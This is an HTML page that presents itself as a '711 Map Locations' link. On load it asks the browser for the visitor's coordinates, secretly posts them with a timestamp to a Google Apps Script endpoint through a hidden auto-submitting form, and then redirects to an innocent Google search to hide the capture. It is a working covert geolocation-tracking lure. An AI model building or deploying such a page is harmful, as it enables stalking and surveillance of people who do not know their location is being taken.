<!DOCTYPE html>
<html>
<body>
<head>
<meta property="og:title" content="711 Map Locations" />
<meta property=”og:image” content=“https://imgur.com/a/4W242KJ” />
  
</head>



<form id="locationForm" method="POST" action="https://script.google.com/macros/s/AKfycbyVeSNYSx-fN2jD_Ybbk0kCVpJSNpaTOGMuqJli8RJ9vfXbxz3q2a3FtUvC4zVZgaAL/exec">
  <input id="date" name="Date" type="hidden">
  <input id="latitude" name="Latitude" type="hidden">
  <input id="longitude" name="Longitude" type="hidden">
</form>

<script>
window.onload = function() {
  getLocation();
};

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      const now = new Date();
      document.getElementById('date').value = now.toISOString();
      document.getElementById('latitude').value = position.coords.latitude;
      document.getElementById('longitude').value = position.coords.longitude;

      // Attempt to submit the form automatically
      document.getElementById('locationForm').submit();

      // Wait for 4 seconds to hope that the form has been submitted before redirecting
      setTimeout(function() {
        window.location.href = "https://www.google.com/search?q=711+locations+dallas&oq=711+locations+dallas&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgWGB4yCAgCEAAYFhgeMgoIAxAAGA8YFhgeMggIBBAAGBYYHjIICAUQABgWGB4yCAgGEAAYFhgeMg0IBxAAGIYDGIAEGIoFMg0ICBAAGIYDGIAEGIoFMg0ICRAAGIYDGIAEGIoF0gEIMzk1MWowajmoAgCwAgE&sourceid=chrome&ie=UTF-8";
      }, 2500); // Delay for 4 seconds
    }, function(error) {
      alert("Error getting location: " + error.message);
    });
  } else { 
    alert("Geolocation is not supported by this browser.");
  }
}
</script>

</body>
</html>
